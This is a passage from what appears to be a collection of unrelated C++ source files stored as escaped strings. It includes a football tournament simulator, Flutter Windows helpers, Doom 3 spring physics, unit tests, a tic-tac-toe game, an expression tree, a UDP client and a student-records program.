equipos.begin() + (i + 1) * 4, [](const Equipo &a, const Equipo &b) {\n            return a.puntos > b.puntos;\n        });\n\n        grupos[i] = vector<Equipo>(equipos.begin() + i * 4, equipos.begin() + (i + 1) * 4);\n    }\n}\n\nvoid simularCopaAmerica() {\n    srand(time(0));\n\n    vector<Equipo> equipos;\n\n    ifstream archivoEquipos(\"equipos.txt\");\n\n    if (!archivoEquipos.is_open()) {\n        cerr << \"No se pudo abrir el archivo de equipos\" << endl;\n        return;\n    }\n\n    string nombreEquipo;\n    vector<string> nombresEstadios = {\"Allegiant Stadium\", \"Las Vegas\", \"Nevada\", \"AT&T Stadium\", \" Arlington\", \" Texas\", \"Bank of America Stadium\", \" Charlotte\", \"North Carolina\", \"Children's Mercy Park\", \" Kansas City\", \"Kansas\"};\n\n    while (getline(archivoEquipos, nombreEquipo)) {\n        string nombreEstadio = nombresEstadios[rand() % nombresEstadios.size()];\n        equipos.push_back({nombreEquipo, nombreEstadio, 0, 0, false});\n    }\n\n    archivoEquipos.close();\n\n    vector<vector<Equipo>> grupos;\n    generarGrupos(equipos, grupos);\n\n    simularFaseGrupos(grupos);\n\n    vector<Equipo> equiposCuartos;\n    for (const auto &",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, utf8_string.data(),\n      target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "/*\n===========================================================================\n\nDoom 3 GPL Source Code\nCopyright (C) 1999-2011 id Software LLC, a ZeniMax Media company. \n\nThis file is part of the Doom 3 GPL Source Code (?Doom 3 Source Code?).  \n\nDoom 3 Source Code is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nDoom 3 Source Code is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n\nYou should have received a copy of the GNU General Public License\nalong with Doom 3 Source Code.  If not, see <http://www.gnu.org/licenses/>.\n\nIn addition, the Doom 3 Source Code is also subject to certain additional terms. You should have received a copy of these additional terms immediately following the terms and conditions of the GNU General Public License which accompanied the Doom 3 Source Code.  If not, please request a copy in writing from id Software at the address below.\n\nIf you have questions concerning this license or the applicable additional terms, you may contact in writing id Software LLC, c/o ZeniMax Media Inc., Suite 120, Rockville, Maryland 20850 USA.\n\n===========================================================================\n*/\n\n#include \"precompiled.h\"\n#pragma hdrstop\n\n#include \"../Game_local.h\"\n\nCLASS_DECLARATION( idForce, idForce_Spring )\nEND_CLASS\n\n/*\n================\nidForce_Spring::idForce_Spring\n================\n*/\nidForce_Spring::idForce_Spring( void ) {\n\tKstretch\t\t= 100.0f;\n\tKcompress\t\t= 100.0f;\n\tdamping\t\t\t= 0.0f;\n\trestLength\t\t= 0.0f;\n\tphysics1\t\t= NULL;\n\tid1\t\t\t\t= 0;\n\tp1\t\t\t\t= vec3_zero;\n\tphysics2\t\t= NULL;\n\tid2\t\t\t\t= 0;\n\tp2\t\t\t\t= vec3_zero;\n}\n\n/*\n================\nidForce_Spring::~idForce_Spring\n================\n*/\nidForce_Spring::~idForce_Spring( void ) {\n}\n\n/*\n================\nidForce_Spring::InitSpring\n================\n*/\nvoid idForce_Spring::InitSpring( float Kstretch, float Kcompress, float damping, float restLength ) {\n\tthis->Kstretch = Kstretch;\n\tthis->Kcompress = Kcompress;\n\tthis->damping = damping;\n\tthis->restLength = restLength;\n}\n\n/*\n================\nidForce_Spring::SetPosition\n================\n*/\nvoid idForce_Spring::SetPosition( idPhysics *physics1, int id1, const idVec3 &p1, idPhysics *physics2, int id2, const idVec3 &p2 ) {\n\tthis->physics1 = physics1;\n\tthis->id1 = id1;\n\tthis->p1 = p1;\n\tthis->physics2 = physics2;\n\tthis->id2 = id2;\n\tthis->p2 = p2;\n}\n\n/*\n================\nidForce_Spring::Evaluate\n================\n*/\nvoid idForce_Spring::Evaluate( int time ) {\n\tfloat length;\n\tidMat3 axis;\n\tidVec3 pos1, pos2, velocity1, velocity2, force, dampingForce;\n\timpactInfo_t info;\n\n\tpos1 = p1;\n\tpos2 = p2;\n\tvelocity1 = velocity2 = vec3_origin;\n\n\tif ( physics1 ) {\n\t\taxis = physics1->GetAxis( id1 );\n\t\tpos1 = physics1->GetOrigin( id1 );\n\t\tpos1 += p1 * axis;\n\t\tif ( damping > 0.0f ) {\n\t\t\tphysics1->GetImpactInfo( id1, pos1, &info );\n\t\t\tvelocity1 = info.velocity;\n\t\t}\n\t}\n\n\tif ( physics2 ) {\n\t\taxis = physics2->GetAxis( id2 );\n\t\tpos2 = physics2->GetOrigin( id2 );\n\t\tpos2 += p2 * axis;\n\t\tif ( damping > 0.0f ) {\n\t\t\tphysics2->GetImpactInfo( id2, pos2, &info );\n\t\t\tvelocity2 = info.velocity;\n\t\t}\n\t}\n\n\tforce = pos2 - pos1;\n\tdampingForce = ( damping * ( ((velocity2 - velocity1) * force) / (force * force) ) ) * force;\n\tlength = force.Normalize();\n\n\t// if the spring is stretched\n\tif ( length > restLength ) {\n\t\tif ( Kstretch > 0.0f ) {\n\t\t\tforce = ( Square( length - restLength ) * Kstretch ) * force - dampingForce;\n\t\t\tif ( physics1 ) {\n\t\t\t\tphysics1->AddForce( id1, pos1, force );\n\t\t\t}\n\t\t\tif ( physics2 ) {\n\t\t\t\tphysics2->AddForce( id2, pos2, -force );\n\t\t\t}\n\t\t}\n\t}\n\telse {\n\t\tif ( Kcompress > 0.0f ) {\n\t\t\tforce = ( Square( length - restLength ) * Kcompress ) * force - dampingForce;\n\t\t\tif ( physics1 ) {\n\t\t\t\tphysics1->AddForce( id1, pos1, -force );\n\t\t\t}\n\t\t\tif ( physics2 ) {\n\t\t\t\tphysics2->AddForce( id2, pos2, force );\n\t\t\t}\n\t\t}\n\t}\n}\n\n/*\n================\nidForce_Spring::RemovePhysics\n================\n*/\nvoid idForce_Spring::RemovePhysics( const idPhysics *phys ) {\n\tif ( physics1 == phys ) {\n\t\tphysics1 = NULL;\n\t}\n\tif ( physics2 == phys ) {\n\t\tphysics2 = NULL;\n\t}\n}\n",
    "#include \"common/utility.hpp\"\n\n#include <gtest/gtest.h>\n\n#include <map>\n#include <functional>\n\nusing namespace std;\n\nTEST(utility, merge_maps) {\n    map<string, int> a;\n    map<string, int> b;\n\n    a[\"a\"] = 50;\n    a[\"x\"] = 1;\n    a[\"y\"] = 2;\n    a[\"z\"] = 3;\n\n    b[\"b\"] = 60;\n    b[\"x\"] = 10;\n    b[\"y\"] = 20;\n    b[\"z\"] = 30;\n\n    merge_maps(a, b, std::plus<int>());\n\n    ASSERT_EQ(5u, a.size());\n    ASSERT_EQ(50, a[\"a\"]);\n    ASSERT_EQ(60, a[\"b\"]);\n    ASSERT_EQ(11, a[\"x\"]);\n    ASSERT_EQ(22, a[\"y\"]);\n    ASSERT_EQ(33, a[\"z\"]);\n}\n\n\nTEST(utility, merge_maps_self) {\n    map<string, int> a;\n    map<string, int> b;\n\n    a[\"a\"] = 50;\n    a[\"x\"] = 1;\n    a[\"y\"] = 2;\n    a[\"z\"] = 3;\n\n    merge_maps(a, a, std::plus<int>());\n\n    ASSERT_EQ(4u, a.size());\n    ASSERT_EQ(100, a[\"a\"]);\n    ASSERT_EQ(2, a[\"x\"]);\n    ASSERT_EQ(4, a[\"y\"]);\n    ASSERT_EQ(6, a[\"z\"]);\n}\n\nTEST(utility, deref_compare) {\n    int a = 7;\n    int b = 9;\n\n    deref_compare< int, std::less> lt;\n    EXPECT_TRUE(lt(&a, &b));\n    EXPECT_FALSE(lt(&b, &a));\n\n    deref_compare< int, std::greater> gt;\n    EXPECT_TRUE(gt(&b, &a));\n    EXPECT_FALSE(gt(&a, &b));\n}\n\nTEST(utility, read_lines) {\n    std::stringstream ss(\"1 2\\n3\\n4\");\n    auto lines = read_lines(ss);\n    std::vector<std::string> expected{\"1 2\", \"3\", \"4\"};\n    EXPECT_EQ(expected, lines);\n}\n",
    "#include <iostream>\r\n#include <windows.h>\r\nusing namespace std;\r\nint arr[4][4];                    //x-o\u0627\u0644\u0627\u0631\u0631\u0627\u064a \u0627\u0644\u0644\u064a \u0647\u064a\u0628\u0642\u064a \u062c\u0648\u0627\u0647\u0627 \u0627\u0644\r\nchar player1;                //\u062d\u0631\u0641 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0627\u0648\u0644\r\nchar player2;                //\u062d\u0631\u0641 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u062b\u0627\u0646\u064a\r\nbool x = false;               // true\u0644\u0648 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0644\u064a \u0645\u062e\u062a\u0627\u0631 \u0627\u0643\u0633 \u0643\u0633\u0628 \u062f\u0627 \u064a\u0628\u0642\u064a \u0628\r\nbool o = false;\r\nbool flag = true;               // \u062f\u0627 \u0647\u0646\u062d\u062a\u0627\u062c\u0648 \u0639\u0634\u0627\u0646 \u0646\u063a\u064a\u0631 \u0627\u0644\u0627\u062f\u0648\u0627\u0631 \u0647\u062a\u0639\u0631\u0641\u0648 \u0628\u0639\u062f\u064a\u0646\r\nvoid display() {                    //\u0641\u0627\u0646\u0643\u0634\u0646 \u0628\u062a\u0638\u0647\u0631 \u0627\u0644\u0634\u0628\u0643\u0647\r\n    /*\r\n                                         |  1   |  2    |  3    |    4    |\r\n                                         ----------------------------------\r\n                                       1 |      |       |       |         |\r\n                                         ----------------------------------\r\n                                       2 |      |       |       |         |\r\n                                         ----------------------------------\r\n                                       3 |      |       |       |         |\r\n                                         ----------------------------------\r\n                                       4 |      |       |       |         |\r\n                                         ----------------------------------\r\n    */\r\n    system(\"cls\");\r\n    cout << \"  |  1  |  2  |  3  |  4  |\" << '\\n';\r\n    cout << \"  --------------------------\" << endl;\r\n    for (int i = 0; i < 4; i++) {\r\n        cout << i + 1 << ' ';                    //\u0639\u0634\u0627\u0646 \u064a\u0637\u0628\u0639 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0644\u064a \u062c\u0646\u0628 \u0643\u0644 \u0635\u0641 \u0632\u064a \u0645\u0627\u0646\u062a\u0627 \u0634\u0627\u064a\u0641 \u0643\u062f\u0647\r\n        for (int j = 0; j < 4; j++) {\r\n            if ((char)arr[i][j] == 0)            //\u0647\u0646\u0627 \u0644\u0648 \u0645\u0643\u0646\u0634 \u0641\u064a \u0639\u0646\u0635\u0631 \u0628\u064a\u062d\u0637 \u0645\u0633\u0627\u0641\u0647 \u0645\u0643\u0627\u0646\u0648 \u0639\u0634\u0627\u0646 \u0645\u064a\u0628\u0648\u0638\u0634 \u062a\u0646\u0633\u064a\u0642 \u0627\u0644\u0634\u0628\u0643\u0647\r\n                cout << \"|     \";\r\n            else {\r\n                cout << \"|  \" << (char)arr[i][j] << \"  \";\r\n\r\n            }\r\n        }\r\n        cout << \"|\\n  --------------------------\" << endl;\r\n\r\n    }\r\n\r\n\r\n\r\n\r\n}\r\n\r\nvoid the_game() {                //\u062f\u064a \u0628\u0642\u0627 \u0627\u0644\u0645\u0633\u0648\u0648\u0644\u0647 \u0639\u0646 \u0627\u0644\u0644\u0639\u0628 \u0628\u0642\u0627 \u0647\u064a \u0627\u0644\u0644\u064a \u0628\u062a\u062d\u062f\u062f \u0645\u064a\u0646 \u0627\u0644\u0644\u064a \u0639\u0644\u064a\u0647 \u0627\u0644\u062f\u0648\u0631 \u0648\u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0634\u062e\u0635 \u062d\u0637 \u0641\u064a \u0645\u0643\u0627\u0646 \u0645\u064a\u0646\u0641\u0639\u0634\r\n    if (flag) {                    //\u0639\u0634\u0627\u0646 \u064a\u0642\u0648\u0644\u064a \u0627\u0646 \u0643\u062f\u0647 \u062f\u0648\u0631 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u062a\u0627\u0646\u064afalse \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0627\u0648\u0644\u064a \u0647\u0648 \u0627\u0644\u0644\u064a \u0639\u0644\u064a\u0647 \u0627\u0644\u062f\u0648\u0631 \u0648\u0628\u0639\u062f \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u0627\u0648\u0644 \u0645 \u0628\u064a\u062e\u0644\u0635 \u0628\u064a\u062a\u0639\u0645\u0644 true\u0627\u0644\u0644\u064a \u0639\u0627\u0645\u0644\u0648 \u0641\u0648\u0642 \u062f\u0627 \u0644\u0645\u0627 \u0628\u064a\u0643\u0648\u0646 \u0628 bool\u0627\u0644\u0644\u064a \u062c\u0648\u0627 \u062f\u064a \u0641 \u062f\u0627 \u0627\u0644flag \u0628\u0627\u0644\u0646\u0633\u0628\u0629 \u0644\r\n        //\u0627\u0644\u0644\u064a \u0627\u0646\u0627 \u0643\u0627\u062a\u0628\u0647\u0627 \u062f\u064a \u0628\u0633 \u0627\u0646\u0627 \u0628\u062e\u062a\u0635\u0631flag \u0647\u064a \u0647\u064a  flag == true \u0645\u0644\u062d\u0648\u0638\u0647 \r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"  player 1 it's your turn\" << \"\\n\";\r\n        cout << \"  -----------------------\" << \"\\n\\n\";\r\n        cout << \"--choose your Coordinates--\" << '\\n';\r\n        int x, y;\r\n        cin >> x >> y;\r\n        if (arr[x - 1][y - 1] == 'X' || arr[x - 1][y - 1] == 'O') {            //\u0628\u0634\u0648\u0641 \u0644\u0648 \u0627\u0644\u0645\u0643\u0627\u0646 \u0627\u0644\u0644\u064a \u0627\u062e\u062a\u0627\u0631\u0648 \u0627\u0644\u0644\u0627\u0639\u0628 \u062d\u062f \u0627\u062e\u062a\u0627\u0631\u0648 \u0642\u0628\u0644 \u0643\u062f\u0647 \u0648\u0644\u0627 \u0644\u0627\r\n            cout << \"You have to choose another Coordinates \\n\";\r\n            the_game();\t\t\t\t\t\t\t\t\t\t\t\t\t\t//\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n            return;\r\n        }\r\n        if (x > 4 || y > 4) {                                //\u0644\u0648 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0644\u0644\u064a \u0627\u062e\u062a\u0627\u0631\u0648 \u0627\u0643\u0628\u0631 \u0645\u0646 4\r\n            cout << \"the number must be less than or equel 4\" << '\\n';\r\n            the_game();\r\n            return;\r\n        }\r\n        arr[x - 1][y - 1] = toupper(player1);            //\u0644\u0648 \u0627\u0644\u0631\u0642\u0645 \u0627\u0644\u0644\u064a \u062d\u0637\u0648 \u0627\u0644\u0634\u062d\u0635 \u0643\u0627\u0646 \u0635\u062d \u0648\u0639\u062f\u064a \u0645\u0646 \u0643\u0644 \u0627\u0644\u0644\u064a \u0641\u0627\u062a \u0647\u064a\u062d\u0637\u0648 \u0641\u064a \u0627\u0644\u0627\u0631\u0631\u064a \u0628\u0642\u0627\r\n        //\u0641 \u0647\u062a\u062d\u0648\u0644\u0648 \u0644\u0643\u0627\u0628\u062a\u0644small\u062f\u064a \u0628\u062a\u062e\u0644\u064a \u0627\u0644\u062d\u0631\u0641 \u0643\u0627\u0628\u062a\u0644 \u062d\u062a\u0649 \u0644\u0648 \u0627\u0644\u0634\u062e\u0635 \u0645\u062f\u062e\u0644\u0648 toupper \u0645\u0644\u062d\u0648\u0638\u0647 \u0641\u0627\u0646\u0643\u0634\u0646 \u0627\u0644\r\n        flag = false;               // \u0639\u0634\u0627\u0646 \u0627\u0644\u0645\u0631\u0647 \u0627\u0644\u062c\u0627\u064a\u0647 \u064a\u0628\u0642\u0649 \u0639\u0627\u0631\u0641 \u0627\u0646 \u0627\u0644\u0644\u064a \u0639\u0644\u064a\u0647 \u0627\u0644\u062f\u0648\u0631 \u0647\u0648 \u0627\u0644\u0644\u0627\u0639\u0628 \u0627\u0644\u062a\u0627\u0646\u064a false\u062f\u0627 \u064a\u0628\u0642\u0649 bool\u0647\u0646\u0627 \u0628\u064a\u062e\u0644\u064a \u0627\u0644\r\n\r\n    }\r\n    else {\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"  player 2 it's your turn\" << \"\\n\";\r\n        cout << \"  -----------------------\" << '\\n';\r\n        cout << \"--choose your Coordinates--\" << '\\n';\r\n        int x, y;\r\n        cin >> x >> y;\r\n        if (arr[x - 1][y - 1] == 'X' || arr[x - 1][y - 1] == 'O') {\r\n            cout << \"You have to choose another Coordinates \\n\";\r\n            the_game();        //\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n    \r\n            return;\r\n        }\r\n        if (x > 4 || y > 4) {\r\n            cout << \"the number must be less than or equel 4\" << '\\n';\r\n            the_game();       //\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n        \r\n            return;\r\n        }\r\n        arr[x - 1][y - 1] = toupper(player2);\r\n        flag = true;\r\n\r\n    }\r\n}\r\nvoid check(char P1, char P2) {            //\u062f\u064a \u0641\u0627\u0646\u0643\u0634\u0646 \u0628\u062a\u0634\u062a\u063a\u0644 \u0644\u0645\u0627 \u0627\u0644\u0644\u0627\u0639\u0628 \u064a\u062f\u062e\u0644 \u0627\u0644\u062d\u0631\u0641 \u0628\u062a\u0627\u0639\u0648 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0647\u0648 \u0645\u0638\u0628\u0648\u0637 \u0648\u0644\u0627 \u0644\u0627\r\n\r\n    if ((toupper(P1) != 88) && toupper(P1) != 79) {\r\n        cout << \"Player 1 -> You have to choose betwen X or O ONLY\" << endl;\r\n        cin >> P1;\r\n        check(P1, P2); //\u0627\u0644\u0641\u0627\u0646\u0643\u0634\u0646 \u0647\u062a\u0639\u064a\u062f \u0646\u0641\u0633\u0647\u0627 \u0639\u0634\u0627\u0646 \u062a\u0634\u0648\u0641 \u0644\u0648 \u0641\u064a \u0623\u062e\u0637\u0621 \u0648\u0644\u0627 \u0644\u0627 \r\n        \r\n        return;\r\n    }\r\n    if (toupper(P2) != 88 && toupper(P2) != 79) {\r\n        cout << \"Player 2 -> You have to choose betwen X or O ONLY\" << endl;\r\n        cin >> P2;\r\n        check(P1, P2);\r\n        return;\r\n    }\r\n    if (P1 == P2) {\r\n        cout << \"You can't choose \" << P1 << \" (player 1) have it",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include <iostream>\n#include <stack>\nusing namespace std;\n// Node structure for the expression tree\nstruct Node {\n    char data;\n    Node* left;\n    Node* right;\n    Node(char val) {\n        data = val;\n        left = nullptr;\n        right = nullptr;\n    }\n};\n// Function to check if a character is an operand\nbool isOperand(char c) {\n    return isalpha(c);\n}\n// Function to construct an expression tree from prefix expression\nNode* constructExpressionTree(string prefixExpression) {\n    stack<Node*> st;\n    for (int i = prefixExpression.size() - 1; i >= 0; i--) {\n        char c = prefixExpression[i];\n        if (isOperand(c)) {\n            st.push(new Node(c));\n        } else {\n            Node* newNode = new Node(c);\n            newNode->left = st.top();\n            st.pop();\n            newNode->right = st.top();\n            st.pop();\n            st.push(newNode);\n        }\n    }\n    return st.top();\n}\n// Function to perform postorder traversal of the expression tree (non-recursive)\nvoid postorderTraversal(Node* root) {\n    if (root == nullptr) return;\n    stack<Node*> st;\n    Node* prev = nullptr;\n    st.push(root);\n    while (!st.empty()) {\n        Node* curr = st.top();\n        if (!prev || prev->left == curr || prev->right == curr) {\n            if (curr->left) {\n                st.push(curr->left);\n            } else if (curr->right) {\n                st.push(curr->right);\n            }\n        } else if (curr->left == prev) {\n            if (curr->right) {\n                st.push(curr->right);\n            }\n        } else {\n            cout << curr->data << \" \";\n            st.pop();\n        }\n        prev = curr;\n    }\n}\n// Function to delete the entire expression tree\nvoid deleteTree(Node* root) {\n    if (root == nullptr) return;\n    deleteTree(root->left);\n    deleteTree(root->right);\n    delete root;\n}\nint main() {\n    string prefixExpression;\n    cout << \"Enter the prefix expression: \";\n    cin >> prefixExpression;\n    Node* root = constructExpressionTree(prefixExpression);\n    cout << \"Postorder Traversal: \";\n    postorderTraversal(root);\n    cout << endl;\n    // Delete the entire tree to free up memory\n    deleteTree(root);\n    return 0;\n}\n\n",
    "#include <array>\n#include <iostream>\n#include <boost/asio.hpp>\n\nusing boost::asio::ip::udp;\n\nint main(int argc, char *argv[])\n{\n    try\n    {\n        if (argc != 3)\n        {\n            std::cerr << \"Usage: client <host1> <port>\" << std::endl;\n            return 1;\n        }\n\n        boost::asio::io_context io_context;\n\n        // Define the target endpoint (localhost, port 14)\n        boost::asio::ip::udp::endpoint receiver1_endpoint(boost::asio::ip::address::from_string(argv[1]), std::stoi(argv[2]));\n\n        udp::socket socket(io_context);\n        socket.open(udp::v4());\n\n        std::array<char, 1> send_buf = {{0}};\n        socket.send_to(boost::asio::buffer(send_buf), receiver1_endpoint);\n\n        std::array<char, 128> recv_buf;\n        udp::endpoint sender_endpoint;\n        size_t len = socket.receive_from(\n            boost::asio::buffer(recv_buf), sender_endpoint);\n\n        std::cout.write(recv_buf.data(), len);\n    }\n    catch (std::exception &e)\n    {\n        std::cerr << e.what() << std::endl;\n    }\n\n    return 0;\n}\n",
    "#include<iostream>\r\n#include<fstream>\r\n#include<cstring>\r\nusing namespace std;\r\n\r\nclass Student\r\n{\r\n\tint roll;\r\n\tchar div;\r\n\tchar name[100];\r\n\tchar address[100];\r\n\r\n\tStudent()\r\n\t{\r\n\t\troll = 0;\r\n\t\tdiv = ' ';\r\n\t}\r\n\t\r\n\tStudent(int r,char n[],char d,char a[])\r\n\t{\r\n\t\troll = r;\r\n\t\tdiv = d;\r\n\t\tstrcpy(name,n);\r\n\t\tstrcpy(address,a);\r\n\t}\r\n\r\n\tfriend class DataBase;\r\n};\r\n\r\nclass DataBase\r\n{\r\n\t\tstring fileName = \"student.txt\";\r\n\t\tint count = 0;\r\n\t\tfstream finOut;\r\n\tpublic:\r\n\t\tDataBase()\r\n\t\t{\r\n\t\t\tfinOut.open(fileName,ios::out);\r\n\t\t\tfinOut.close();\r\n\t\t}\r\n\r\n\t\tvoid addRecord()\r\n\t\t{\r\n\t\t\tfinOut.open(fileName,ios::app);\r\n\t\t\tint roll;\r\n\t\t\tchar div,name[100],address[100];\r\n\r\n\t\t\tcin.ignore(); // To clear Input Buffer\r\n\t\t\tcout<<\"Enter Student Name : \";\r\n\t\t\tscanf(\"%[^\\n]\",name); // To take spaces too\r\n\r\n\t\t\tcout<<\"Enter Student Roll no. : \";\r\n\t\t\tcin>>roll;\r\n\t\t\tcout<<\"Enter Student Division : \";\r\n\t\t\tcin>>div;\r\n\r\n\t\t\tcin.ignore(); // To clear Input Buffer\r\n\t\t\tcout<<\"Enter Student Address : \";\r\n\t\t\tscanf(\"%[^\\n]\",address);\r\n\r\n\t\t\tStudent s(roll,name,div,address);\r\n\r\n\t\t\tfinOut.write((char*)&s,sizeof(s));\r\n\t\t\tfinOut.close();\r\n\t\t\tcount++;\t\r\n\t\t}\r\n\r\n\t\tvoid showRecords()\r\n\t\t{\r\n\t\t\tStudent s;\r\n\t\t\tfinOut.open(fileName,ios::in);\r\n\t\t\tcout<<\"\\tRoll No.\\tName\\tDivision\\tAddress\"<<endl;\r\n\r\n\t\t\tfor(int i = 0; i < count; i++)\r\n\t\t\t{\r\n\t\t\t\tfinOut.read((char*)&s,sizeof(s));\r\n\t\t\t\tcout<<\"\\t\"<<s.roll<<\"\\t\\t\"<<s.name<<\"\\t\"<<s.div<<\"\\t\\t\"<<s.address<<endl;\r\n\t\t\t}\r\n\t\t\tfinOut.close();\r\n\t\t}\r\n\t\tbool search(int e)\r\n\t\t{\r\n\t\t\tfinOut.open(fileName,ios::in);\r\n\t\t\tStudent s;\r\n\t\t\tfor(int i = 0; i < count; i++)\r\n\t\t\t{\r\n\t\t\t\tfinOut.read((char*)&s,sizeof(s));\r\n\t\t\t\tif(s.roll == e)\r\n\t\t\t\t{\r\n\t\t\t\t\tcout<<\"\\nRecord Found : \\n\\n\";\r\n\t\t\t\t\tcout<<\"\\tRoll No.\\tName\\tDivision\\tAddress\"<<endl;\r\n\t\t\t\t\tcout<<\"\\t\"<<s.roll<<\"\\t\\t\"<<s.name<<\"\\t\"<<s.div<<\"\\t\\t\"<<s.address<<endl;\r\n\t\t\t\t\tfinOut.close();\r\n\t\t\t\t\treturn true;\r\n\t\t\t\t}\r\n\t\t\t}\t\t\t\r\n\t\t\tfinOut.close();\t\r\n\t\t\treturn false;\r\n\r\n\t\t}\r\n\t\tvoid del(int e)\r\n\t\t{\r\n\t\t\tfinOut.open(fileName,ios::in);\r\n\t\t\tStudent s[count];\r\n\r\n\t\t\tfor(int i = 0; i < count; i++)\r\n\t\t\t\tfinOut.read((char*)&s[i] , sizeof(s[i]));\r\n\t\t\tfinOut.close();\r\n\r\n\t\t\tfinOut.open(fileName,ios::out);\r\n\t\t\tfor(int i = 0; i < count; i++)\r\n\t\t\t{\r\n\t\t\t\tif(s[i].roll != e)\r\n\t\t\t\t\tfinOut.write((char*)&s[i], sizeof(s[i]));\r\n\t\t\t}\r\n\t\t\tcount--;\r\n\t\t\tcout<<\"\\nRecord Deleted Successfully!\"<<endl<<endl;\r\n\t\t\tfinOut.close();\r\n\t\t}\r\n};\r\n\r\nint main()\r\n{\r\n\tDataBase db;\r\n\tint ch,key;\r\n\tdo\r\n\t{\r\n\t\tcout<<\"\\n_______MENU_______\"<<endl;\r\n\t\tcout<<\"1.Add a record.\"<<endl;\r\n\t\tcout<<\"2.Display All Records.\"<<endl;\r\n\t\tcout<<\"3.Delete a record.\"<<endl;\r\n\t\tcout<<\"4.Search a 